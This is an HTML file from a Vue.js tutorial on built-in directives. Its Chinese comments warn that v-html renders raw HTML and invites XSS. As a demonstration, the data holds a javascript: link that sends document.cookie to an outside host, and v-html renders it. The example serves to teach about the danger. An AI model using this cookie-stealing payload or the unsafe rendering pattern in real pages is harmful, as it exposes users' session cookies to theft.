<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>15 内置指令</title>
    <script type="application/javascript" src="../js/vue.js"></script>
</head>
<body>
<!--
v-html指令：
    1.作用：向指定节点中渲染包含html结构的内容。
    2.与插值语法的区别：
          (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
          (2).v-html可以识别html结构。
    3.严重注意：v-html有安全性问题！！！！
          (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
          (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
-->

<div id="root" >
    <div>{{name}}</div>

    <div v-text="name"></div>
    <div v-html="name"></div>
    <div>{{rouUrl}}</div>
    <div>点击获得你想要的</div>
    <div v-html="rouUrl"></div>
</div>

</body>

<script type="application/javascript">
    //阻止Vue在启动时生成生产提示
    Vue.config.productionTip=false;
    new Vue({
        el:'#root',
        data:{
            name:'<h2>Hello World</h2>',
            rouUrl: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击获得你想要的</a>'
            // rouUrl:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击获得你想要的</a>'
        },
        methods:{
            submitInfo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
